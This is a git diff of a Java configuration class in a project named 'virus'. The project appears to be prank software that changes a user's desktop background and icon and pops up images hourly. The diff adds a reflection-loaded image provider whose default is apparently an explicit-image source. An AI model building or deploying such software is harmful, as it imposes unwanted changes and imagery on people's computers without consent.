@@ -1,6 +1,8 @@
 package me.bannock.virus;
 
 import com.google.gson.annotations.SerializedName;
+import me.bannock.virus.images.ImageProviderService;
+import me.bannock.virus.images.impl.YiffProviderService;
 
 public class Config {
     @SerializedName("current")
@@ -17,11 +19,10 @@ public class Config {
     private boolean runHourly = true;
     @SerializedName("icon")
     private boolean setUserIcon = false;
-    @SerializedName("pre")
-    private boolean setPreLoginBackground = true;
-
     @SerializedName("popping")
     private boolean popupImages = true;
+    @SerializedName("provider")
+    private String imageProvider = YiffProviderService.class.getName();
 
     public boolean shouldChangeBackground() {
         return changeBackground;
@@ -79,14 +80,6 @@ public class Config {
         this.setUserIcon = setUserIcon;
     }
 
-    public boolean shouldSetPreLoginBackground() {
-        return setPreLoginBackground;
-    }
-
-    public void setSetPreLoginBackground(boolean setPreLoginBackground) {
-        this.setPreLoginBackground = setPreLoginBackground;
-    }
-
     public boolean shouldPopupImages() {
         return popupImages;
     }
@@ -94,4 +87,24 @@ public class Config {
     public void setPopupImages(boolean popupImages) {
         this.popupImages = popupImages;
     }
+
+    public String getImageProvider() {
+        return imageProvider;
+    }
+
+    public ImageProviderService getImageProvidmurr() {
+        try {
+            return (ImageProviderService) Class.forName(imageProvider, false, getClass().getClassLoader()).newInstance();
+        } catch (ClassNotFoundException | InstantiationException | IllegalAccessException ignored) {}
+        return new YiffProviderService();
+    }
+
+    public void setImageProvider(String imageProvider) {
+        this.imageProvider = imageProvider;
+    }
+
+    public void setImageProvider(Class<? extends ImageProviderService> imageProvider) {
+        this.imageProvider = imageProvider.getName();
+    }
+
 }
